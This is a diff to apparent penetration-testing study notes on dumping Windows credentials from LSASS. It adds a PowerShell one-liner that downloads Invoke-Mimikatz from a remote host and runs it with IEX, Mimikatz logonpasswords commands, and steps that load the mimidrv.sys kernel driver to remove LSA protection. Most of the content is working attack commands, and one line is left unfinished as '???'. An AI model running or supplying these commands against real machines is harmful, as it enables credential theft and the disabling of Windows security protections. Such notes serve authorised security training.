@@ -85,7 +85,16 @@ To dump TGT and TGS:
 ```
 (If you want to be stealthier, you can use [Invoke-Mimikatz](https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Invoke-Mimikatz.ps1)).
 
-2nd method(using [MiniDump.cs](https://github.com/trike33/PEN-300-Code-Snippets/blob/main/Windows%20Credentials/MiniDump.cs)):
+2nd method(using [Invoke-Mimikatz](https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Invoke-Mimikatz.ps1)):
+
+```
+1. PS C:\Windows\system32> (New-Object System.Net.WebClient).DownloadString('http://192.168.1.1/Invoke-Mimikatz.ps1') | IEX
+2. PS C:\Windows\system32> Invoke-Mimikatz -Command "`"sekurlsa::logonpasswords`""
+
+(Alternatively, we can append this line: Invoke-Mimikatz -Command "sekurlsa::logonpasswords"  at the end of the Invoke-Mimikatz.ps1 script, so that when you use the IEX sekurlsa::logonpasswords gets automatically executed and you don't have to fight with double quotes and backticks).
+```
+
+3rd method(using [MiniDump.cs](https://github.com/trike33/PEN-300-Code-Snippets/blob/main/Windows%20Credentials/MiniDump.cs)):
 
 Using this method we will create a dump file, which is a snapshot of a given process.
 
@@ -98,3 +107,18 @@ C:\minidump.exe c:\windows\tasks\lsass.dmp
 #From a mimikatz shell(note that this doesn't require debug privileges)
 1. sekurlsa::minidump lsass.dmp
 2. sekurlsa::logonpasswords
+```
+
+When the popularity of cached credential retrieving raised, Microsoft introduced 2 secuirty measures: LSA Protection and Windows Defender Credential Guard. The LSA protection added an additional process 
+security layer, the Process Protected Light(PPL), which is placed on top of the highest integrity level. This means that SYSTEM level privileges aren't enough to dump the LSASS.
+
+To solve this problem mimikatz relased the [mimidrv.sys](releases/tag/2.2.0-20220919)(go to releases and mimidrv.sys is located inside the .zip/.7z). To load this driver we must have this ??? additional privilege.
+
+```
+C:\Windows\system32> sc create mimidrv binPath= C:\inetpub\wwwroot\upload\mimidrv.sys type= kernel start= demand
+
+C:\Windows\system32> sc start mimidrv
+
+#From a mimikatz shell
+1. !processprotect /process:lsass.exe /remove  -> Afterwards LSA is disabled, meaning that we can dump the LSASS using the method we best like
+```
